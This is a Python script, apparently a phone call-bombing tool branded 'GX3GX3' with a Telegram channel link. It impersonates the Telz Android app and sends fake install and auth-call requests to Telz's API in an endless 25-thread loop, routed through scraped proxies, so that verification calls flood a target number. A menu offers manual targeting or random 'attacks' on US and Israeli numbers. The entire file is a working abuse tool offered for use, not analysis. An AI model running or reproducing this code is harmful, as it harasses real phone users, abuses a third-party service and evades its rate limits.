import subprocess
import sys
import random
import time
import uuid
import string
import json
import webbrowser
import os
from concurrent.futures import ThreadPoolExecutor

# --- Auto-installation of libraries (No deletion) ---
def install_libs():
    libs = ['requests', 'termcolor', 'pyfiglet']
    for lib in libs:
        try:
            __import__(lib)
        except ImportError:
            print(f"[*] Installing {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()

# Import libraries after installation
import requests
from termcolor import colored
import pyfiglet

# Open your channel link (Updated to gx3)
webbrowser.open('https://t.me/gx3gx3')

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

# --- Auto-fetch internal proxies function (No deletion) ---
def fetch_internal_proxies():
    internal_proxies = []
    try:
        response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all", timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            for line in lines:
                if line.strip():
                    internal_proxies.append(f"socks4://{line.strip()}")
    except:
        pass
    return internal_proxies

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    try:
        if os.path.exists(filename):
            with open(filename, "r") as f:
                lines = f.read().splitlines()
                for line in lines:
                    if line.strip():
                        proxies.append(line.strip())
    except:
        pass
    
    print(colored("[*] Fetching additional internal proxies...", "magenta"))
    internal = fetch_internal_proxies()
    proxies.extend(internal)
    
    return list(set(proxies))

def get_random_proxy(proxies):
    if not proxies: return None
    proxy = random.choice(proxies)
    if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
        return {"http": proxy, "https": proxy}
    else:
        if not proxy.startswith("http://") and not proxy.startswith("https://"):
            proxy = "http://" + proxy
        return {"http": proxy, "https": proxy}

def get_proxy_info(proxy):
    apis = ["http://ip-api.com/json", "https://ipinfo.io/json", "https://ipwhois.app/json/"]
    for api_url in apis:
        try:
            start_time = time.time()
            response = requests.get(api_url, proxies=proxy, timeout=5)
            ping = int((time.time() - start_time) * 1000)
            if response.status_code == 200:
                data = response.json()
                if api_url == "http://ip-api.com/json":
                    country, city, isp = data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown")
                elif api_url == "https://ipinfo.io/json":
                    country, city, isp = data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("org", "Unknown")
                elif api_url == "https://ipwhois.app/json/":
                    country, city, isp = data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown")
                return country, city, isp, ping
        except: continue
    return "Unknown", "Unknown", "Unknown", None

def send_install_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=15)
        return response.ok and "ok" in response.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=15)
        return response.ok and "ok" in response.text
    except: return False

# --- Target Selection Menu (English) ---
def get_target_info():
    print(colored("\n[ SELECT ATTACK MODE ]", "yellow", attrs=["bold"]))
    print("1 - Manual Entry (Iraq/Global)")
    print("2 - Random USA Attack 🇺🇸")
    print("3 - Random Israel Attack 🇮🇱")
    choice = input(colored("\nChoose Mode (1, 2, or 3): ", "cyan"))
    
    if choice == '2':
        return "+1", "RANDOM"
    elif choice == '3':
        return "+972", "RANDOM"
    else:
        code = input(colored("🌍 Enter Country Code (e.g., 964): ", "cyan"))
        num = input(colored("📱 Enter Phone Number: ", "green"))
        return f"+{code.strip()}", num.strip()

stats = {"ok": 0, "error": 0}

def worker_task(country_code, number, proxies_list, foreign_langs):
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}

    while True:
        current_num = number
        if number == "RANDOM":
            current_num = "".join(random.choices(string.digits, k=9)) # Super fast random digits

        foxx, fox, foxer = generate_unique_ids()
        random_android_version = str(random.randint(7, 14))
        random_lang = random.choice(foreign_langs)
        proxy = get_random_proxy(proxies_list) if proxies_list else None

        payload_install = json.dumps({
            "android_id": fox, "app_version": "17.5.17", "event": "install",
            "google_exists": "yes", "os": "android", "os_version": random_android_version,
            "play_market": True, "ts": foxx, "uuid": str(foxer)
        })

        try:
            if send_install_request(install_url, headers, payload_install, proxy):
                payload_auth_call = json.dumps({
                    "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                    "event": "auth_call", "lang": random_lang, "os": "android",
                    "os_version": random_android_version, "phone": f"{country_code}{current_num}",
                    "ts": foxx, "uuid": str(foxer)
                })
                if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
                    stats["ok"] += 1
                else: stats["error"] += 1
            else: stats["error"] += 1
        except: stats["error"] += 1

        print(f"\r {colored('✓ Success:', 'green')} {stats['ok']} | {colored('✘ Failed:', 'red')} {stats['error']} | Target: {country_code}{current_num}", end="")

if __name__ == "__main__":
    ascii_art = pyfiglet.figlet_format("G X 3 G X 3", font="slant")
    print(colored(ascii_art, "red", attrs=["bold"]))
    print(colored("Dev: @PDD6P | Channel: gx3gx3", "white"))

    country_code, number = get_target_info()
    
    # Original language list remains intact
    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu", "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu", "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af", "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk", "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm", "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady", "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar", "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch", "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv", "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo", "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got", "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo", "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr", "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz", "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc", "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn", "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam", "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug", "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn", "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm", "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te", "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty", "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo", "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan", "zh-yue", "zu"]

    proxies_list = load_proxies("gx1gx1.txt")
    
    print(colored("\n[*] Starting attack with max speed (25 Threads)...", "yellow"))
    
    with ThreadPoolExecutor(max_workers=25) as executor:
        for _ in range(25):
            executor.submit(worker_task, country_code, number, proxies_list, foreign_langs)
